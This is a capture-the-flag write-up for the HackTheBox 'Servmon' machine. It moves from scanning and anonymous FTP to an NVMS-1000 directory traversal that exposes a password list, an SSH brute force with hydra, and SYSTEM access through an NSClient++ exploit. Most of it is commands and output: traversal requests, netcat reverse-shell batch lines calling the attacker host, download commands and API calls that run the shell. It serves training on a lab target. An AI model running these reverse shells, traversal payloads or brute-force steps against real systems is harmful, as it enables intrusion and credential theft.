---
title: "HackTheBox Machine - Servmon"
classes: wide
header:
  teaser: /assets/images/htb-frame.png
search: false
categories: 
  - HackTheBox Machine
toc: true
toc_label: "Contents"
last_modified_at: 2020-06-19 21:51:00
---

![HTB Servmon](/assets/images/htb-machine-servmon/featured-image.jpg)

ServMon is a retired machine, and it was an easy windows machine, but some of the problems like not compatible when we were open some of the services on the browser, and to solved it, we needed some tricks and tips from the APIs documentation.

### Network Scanning

In the first step we need to find some information about the machine, like what kinds of `services`, open `ports`, and `operating system`. we could to run nmap command: `nmap -A -sV -sC -oN servmon.nmap 10.10.10.184`

```
# Nmap 7.80 scan initiated Tue Apr 14 11:10:21 2020 as: nmap -A -sV -sC -oN servmon.nmap 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.41s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=4/14%Time=5E9537F2%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=4/14%Time=5E9537FB%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\x12\x02\x18\0\x1aE\n\x07workers\x12\x0b\n\x04jobs\x12\x03\
SF:x18\xbf\n\x12")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x
SF:2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.
SF:1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(R
SF:TSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocumen
SF:t\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length
SF::\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9m35s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-14T04:23:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 14 11:13:49 2020 -- 1 IP address (1 host up) scanned in 208.30 seconds
```

After we run `nmap`, we got some open ports such as `21`,`22`, `80`, `135`, `139`, `445`, `5666`,`6699` and `8443`. For the important thing is, we should enumerate
interesting open ports with the services.

### Enumeration

On the Enumeration. First, we look at port `21` or `FTP` with all of the information shown below.

```
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
```

FTP service can be accessed using anonymous account. we can login without password,just only put `anonymous` as an username and download all files in `Nadine`'s and `Nathan`'s directories.

```
twseptian@twsterlab:~/HTB/boxes/servmon$ ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:twseptian): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nadine
250 CWD command successful.
ftp> ls -l
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
174 bytes received in 0.41 secs (0.4148 kB/s)
ftp> cd ..
250 CWD command successful.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nathan
250 CWD command successful.
ftp> ls -l
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:10PM                  186 Notes to do.txt
226 Transfer complete.
ftp> get Notes to do.txt
local: to remote: Notes
200 PORT command successful.
550 The system cannot find the file specified. 
ftp> ls -l
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:10PM                  186 Notes to do.txt
226 Transfer complete.
ftp> get "Notes to do.txt"
local: Notes to do.txt remote: Notes to do.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
186 bytes received in 0.20 secs (0.8881 kB/s)
ftp> 
```

we got some of the notes,`do.txt` and `Confidental.txt`

notes from `do.txt`
```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```
from `d.txt`, it can be concluded that there are nvms and nsclient services and secret files in Sharepoint

and notes from `Confidental.txt`, we can read below
```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```
on `Confidental.txt` explained `Nadine` left Password.txt on `Nadine`'s Desktop

Let's open the IP address of the machine on the browser. We can look webpage with `nvms-1000` home page.

![nvms-1000](/assets/images/htb-machine-servmon/01.png)

Find `nvms-1000` using `searchploit`

![01](/assets/images/htb-machine-servmon/02.png)

Copy the information using `searchploit -m hardware/webapps/47774.txt` and open 47774.txt. The information is showed below

```
# Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan Türle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Here, we use repeater on `burpsuite` to access directory  `/../../../../../../../../../../../../windows/win.ini`. 

![03](/assets/images/htb-machine-servmon/03.png)


From `Directory Traversal` vulnerability, we can access path/directory on the machine, but nothing showed anything. let's see again note from Nadine to Nathan, She said on her note

```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

That `Password.txt` on Nathan's Desktop, and we can suggest path is `C:\Users\Nathan\Desktop\Passwords.txt`. We can change request to access directory on burpsuite with `GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1`

![04](/assets/images/htb-machine-servmon/04.png)

Request 
```
GET /Pages/login.htm/../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1
```

Response
```
HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

We got some credential lists,or maybe a password list.


### Privilege Escalation - Nadine

After we got the credential list, the Brute force attack using `hydra` can be a solution to find the real password for `Nadine` or `Nathan`.

```
root@twsterlab:/twseptian/HTB/boxes/servmon# hydra -L users.txt -P password.txt 10.10.10.184 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-18 10:52:39
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:2/p:7), ~1 try per task
[DATA] attacking ssh://10.10.10.184:22/
[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-18 10:52:45
```

![05](/assets/images/htb-machine-servmon/05.png)

username: `nadine`
password: `L1k3B1gBut7s@W0rk`

After we got the username and password, let's access the server using ssh services.

```
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine

nadine@SERVMON C:\Users\Nadine>dir
 Volume in drive C has no label.                  
 Volume Serial Number is 728C-D22C                

 Directory of C:\Users\Nadine

08/04/2020  23:16    <DIR>          .
08/04/2020  23:16    <DIR>          ..
18/01/2020  11:23    <DIR>          3D Objects
18/01/2020  11:23    <DIR>          Contacts
08/04/2020  22:28    <DIR>          Desktop
08/04/2020  22:28    <DIR>          Documents
18/01/2020  11:23    <DIR>          Downloads
08/04/2020  22:27    <DIR>          Favorites
08/04/2020  22:27    <DIR>          Links
18/01/2020  11:23    <DIR>          Music
18/01/2020  11:31    <DIR>          OneDrive
18/01/2020  11:23    <DIR>          Pictures
18/01/2020  11:23    <DIR>          Saved Games
18/01/2020  11:23    <DIR>          Searches
18/01/2020  11:23    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)  27,866,316,800 bytes free

nadine@SERVMON C:\Users\Nadine>cd Desktop

nadine@SERVMON C:\Users\Nadine\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine\Desktop

08/04/2020  22:28    <DIR>          .
08/04/2020  22:28    <DIR>          ..
12/05/2020  07:35                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  27,866,320,896 bytes free

nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
7a2a9417558a347042964103acc4c2c1

nadine@SERVMON C:\Users\Nadine\Desktop>
```

### Privilege Escalation - Administrator

For privesc, we can use `winPEAS.bat` to see all of the services on the server. Here we tried to download from our local machine to server machine using `powershell.exe wget`

```
nadine@SERVMON C:\>powershell.exe wget "http://10.10.14.15:80/winPEAS.bat" -outfile "c:\temp\winPEAS.bat"

nadine@SERVMON C:\>cd c:\temp

nadine@SERVMON c:\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of c:\Temp

12/05/2020  08:40    <DIR>          .
12/05/2020  08:40    <DIR>          ..
12/05/2020  08:37                 0 powershell.exe
12/05/2020  08:40            32,976 winPEAS.bat
               2 File(s)         32,976 bytes
               2 Dir(s)  27,863,298,048 bytes free

nadine@SERVMON c:\Temp>
```

Run the `winPEAS.bat` program and see the services that are running on the administrator, below the output from winPEAS.bat.

```
<redacted>
Common Files
Common Files
InstallShield Installation Information
Internet Explorer
Internet Explorer
Microsoft.NET
ModifiableWindowsApps
NSClient++
NVMS-1000
Reference Assemblies
Reference Assemblies
UNP
VMware
Windows Defender
Windows Defender
Windows Defender Advanced Threat Protection
Windows Mail
Windows Mail
Windows Multimedia Platform
Windows Multimedia Platform
Windows NT
Windows NT
Windows Photo Viewer
Windows Photo Viewer
Windows Portable Devices
Windows Portable Devices
Windows Security
WindowsPowerShell
WindowsPowerShell
    InstallLocation    REG_SZ    C:\Program Files\VMware\VMware Tools\
    InstallLocation    REG_SZ    C:\Program Files (x86)\NVMS-1000\
    InstallLocation    REG_SZ    C:\Program Files (x86)\NVMS-1000\
<redacted>
```
From the output displayed, it can be seen that the services running and connecting to the server are NVMS-1000 and NSClient++, and also we can see on winPEAS result used ports

```
<redacted>
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] USED PORTS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
[i] Check for services restricted from the outside
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       2524
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2716
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       8120
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5036
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2628
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2628
  TCP    0.0.0.0:6063           0.0.0.0:0              LISTENING       8120
  TCP    0.0.0.0:6699           0.0.0.0:0              LISTENING       8120
  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       2628
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       480
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1060
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1492
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2072
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       612
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2380
  TCP    10.10.10.184:139       0.0.0.0:0              LISTENING       4
  TCP    [::]:21                [::]:0                 LISTENING       2524
  TCP    [::]:22                [::]:0                 LISTENING       2716
  TCP    [::]:135               [::]:0                 LISTENING       864
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5666              [::]:0                 LISTENING       2628
  TCP    [::]:49664             [::]:0                 LISTENING       620
  TCP    [::]:49665             [::]:0                 LISTENING       480
  TCP    [::]:49666             [::]:0                 LISTENING       1060
  TCP    [::]:49667             [::]:0                 LISTENING       1492
  TCP    [::]:49668             [::]:0                 LISTENING       2072
  TCP    [::]:49669             [::]:0                 LISTENING       612
  TCP    [::]:49670             [::]:0                 LISTENING       2380

<redacted>
```
we can see NSClient++ runs on port `8443`, and that is matching with our network scanning result from Nmap

```
<redacted>
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
<redacted>
```

okay, let's find the vulnerability and exploit using searchploit

![06](/assets/images/htb-machine-servmon/06.png)

use NSClient++ 0.5.2.35 - Privilege Escalation and it shows how to “privilege escalation" using nsclient++

```
Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.  

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
   C:\Program Files\NSClient++>nscp web -- password --display
   Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
   @echo off
   c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
   nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
   - foobar
      command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
   - foobar
      interval = 1m
      command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
   nc -nlvvp 443
   listening on [any] 443 ...
   connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
   Microsoft Windows [Version 10.0.17134.753]
   (c) 2018 Microsoft Corporation. All rights reserved.

   C:\Program Files\NSClient++>whoami
   whoami
   nt authority\system
   
Risk:
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local System

```
Okay we follow the instruction from the note


```
===================================================================
From note
===================================================================
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
 C:\Program Files\NSClient++>nscp web -- password --display
 Current password: SoSecret

===================================================================
From attacker
===================================================================

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.
                                                    
nadine@SERVMON C:\Users\Nadine>cd C:\Program Files\NSClient++

nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini 
´╗┐# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all                                  
# If you want to activate a module and bring in all its options use:                    
#   nscp settings --activate-module <MODULE NAME> --add-defaults                        
# For details run: nscp settings --help                                                 
                                                                                        
                                                                                        
; in flight - TODO                                                                      
[/settings/default]                                                                     
                                                                                        
; Undocumented key                                                                      
password = ew2x6SsGTxjRwXOT                                                             
                               
; Undocumented key             
allowed hosts = 127.0.0.1      
                               
                               
; in flight - TODO             
[/settings/NRPE/server]        
                               
; Undocumented key             
ssl options = no-sslv2,no-sslv3
                               
; Undocumented key             
verify mode = peer-cert        
                               
; Undocumented key             
insecure = false               
                               
                               
; in flight - TODO             
[/modules]                     

; Undocumented key
CheckHelpers = disabled

; Undocumented key
CheckEventLog = disabled

; Undocumented key
CheckNSCP = disabled

; Undocumented key
CheckDisk = disabled

; Undocumented key
CheckSystem = disabled

; Undocumented key
WEBServer = enabled

; Undocumented key
NRPEServer = enabled

; CheckTaskSched - Check status of your scheduled jobs.
CheckTaskSched = enabled

; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA
Scheduler = enabled

; CheckExternalScripts - Module used to execute external scripts
CheckExternalScripts = enabled


; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrapped scrip
ts section. %SCRIPT% will be replaced by the actual script an %ARGS% will be replaced by any given arguments.
[/settings/external scripts/wrappings]

; Batch file - Command used for executing wrapped batch files
bat = scripts\\%SCRIPT% %ARGS%

; Visual basic script - Command line used for wrapped vbs scripts
vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%

; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts
ps1 = cmd /c echo If (-Not (Test-Path "scripts\%SCRIPT%") ) { Write-Host "UNKNOWN: Script `"%SCRIPT%`" not found."; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($lastexit
code) | powershell.exe /noprofile -command -


; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`
[/settings/external scripts/scripts]


; Schedules - Section for the Scheduler module.
[/settings/scheduler/schedules]

; Undocumented key
foobar = command = foobar


; External script settings - General settings for the external scripts module (CheckExternalScripts).
[/settings/external scripts]
allow arguments = true

nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT

nadine@SERVMON C:\Program Files\NSClient++>

```

We got the password nsclient++ : `ew2x6SsGTxjRwXOT`. To access the web page, we need using port forwarding using ssh

`ssh -L 9000:127.0.0.1:8443 nadine@10.10.10.184`

And open google chromium (note: some of the members at HTB forum, recommend to use those), but very slow. So we skipped using a chrome browser.

![07](/assets/images/htb-machine-servmon/07.png)

#### Privilege Escalation using NSClient++ API

to access nsclient++, we have followed the instructions from https://docs.nsclient.org/api/rest/queries/#command-execute

go back again to the note, create evil.bat and follow like the instructions and put out an IP address

```
===================================================================
From note
===================================================================

3. Download nc.exe and evil.bat to c:\temp from attacking machine
 @echo off
 c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
 
===================================================================
From attacker
===================================================================

@echo off
c:\temp\nc.exe -e 10.10.14.15 443 powershell 
```

![08](/assets/images/htb-machine-servmon/08.png)
 
download nc.exe from your computer, and prepare nc.exe and evil.bat and run the webserver
 
![09](/assets/images/htb-machine-servmon/09.png)
 
run these instructions to download nc.exe and evil.bat
 

```
nadine@SERVMON C:\Program Files\NSClient++>cd c:\

nadine@SERVMON c:\>powershell.exe wget "http://10.10.14.15/nc.exe" -outfile "c:\temp\nc.exe"

nadine@SERVMON c:\>powershell.exe wget "http://10.10.14.15/evil.bat" -outfile "c:\temp\me.bat"

nadine@SERVMON c:\>cd c:\temp

nadine@SERVMON c:\Temp>
```


follow the instructions from https://docs.nsclient.org/api/rest/queries/#command-execute and another terminal to access netcat

```
nadine@SERVMON c:\Temp>curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/
scripts/me.bat --data-binary "C:\Temp\nc.exe 10.10.14.15 443 -e cmd.exe"
Enter host password for user 'admin':ew2x6SsGTxjRwXOT
Added me as scripts\me.bat
nadine@SERVMON c:\Temp>curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/me/commands
/execute?time=3m
Enter host password for user 'admin':ew2x6SsGTxjRwXOT

```

![10](/assets/images/htb-machine-servmon/10.png)

Let's create a listener using netcat on our local machine.

```
root@twsterlab:/twseptian# nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.184.
Ncat: Connection from 10.10.10.184:49686.
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system

C:\Program Files\NSClient++>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Administrator

08/04/2020  22:55    <DIR>          .
08/04/2020  22:55    <DIR>          ..
08/04/2020  23:12    <DIR>          3D Objects
08/04/2020  23:12    <DIR>          Contacts
08/04/2020  23:12    <DIR>          Desktop
08/04/2020  23:12    <DIR>          Documents
08/04/2020  23:12    <DIR>          Downloads
08/04/2020  23:12    <DIR>          Favorites
08/04/2020  23:12    <DIR>          Links
08/04/2020  23:12    <DIR>          Music
14/01/2020  19:10    <DIR>          OneDrive
08/04/2020  23:12    <DIR>          Pictures
08/04/2020  23:12    <DIR>          Saved Games
08/04/2020  23:12    <DIR>          Searches
08/04/2020  23:12    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)  27,852,333,056 bytes free

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Administrator

08/04/2020  22:55    <DIR>          .
08/04/2020  22:55    <DIR>          ..
08/04/2020  23:12    <DIR>          3D Objects
08/04/2020  23:12    <DIR>          Contacts
08/04/2020  23:12    <DIR>          Desktop
08/04/2020  23:12    <DIR>          Documents
08/04/2020  23:12    <DIR>          Downloads
08/04/2020  23:12    <DIR>          Favorites
08/04/2020  23:12    <DIR>          Links
08/04/2020  23:12    <DIR>          Music
14/01/2020  19:10    <DIR>          OneDrive
08/04/2020  23:12    <DIR>          Pictures
08/04/2020  23:12    <DIR>          Saved Games
08/04/2020  23:12    <DIR>          Searches
08/04/2020  23:12    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)  27,852,333,056 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Administrator\Desktop

08/04/2020  23:12    <DIR>          .
08/04/2020  23:12    <DIR>          ..
12/05/2020  07:35                34 root.txt
